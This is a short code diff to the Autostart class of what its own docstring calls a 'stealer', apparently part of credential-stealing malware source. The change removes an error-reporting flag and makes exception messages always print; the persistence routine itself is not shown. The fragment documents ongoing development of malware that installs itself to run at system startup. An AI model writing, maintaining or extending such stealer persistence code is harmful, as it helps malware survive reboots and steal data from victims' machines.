@@ -7,10 +7,9 @@ class Autostart:
     """
     Adds the stealer to autostart.
     """
-    def __init__(self, executor_path: str, errors: bool):
+    def __init__(self, executor_path: str):
 
         self.__executor_path = executor_path
-        self.__errors = errors
 
         self.__config = AutostartConfig()
 
@@ -43,4 +42,4 @@ class Autostart:
             self.__add_to_autostart()
 
         except Exception as e:
-            if self.__errors is True: print(f"[Autostart]: {repr(e)}")
+            print(f"[Autostart]: {repr(e)}")
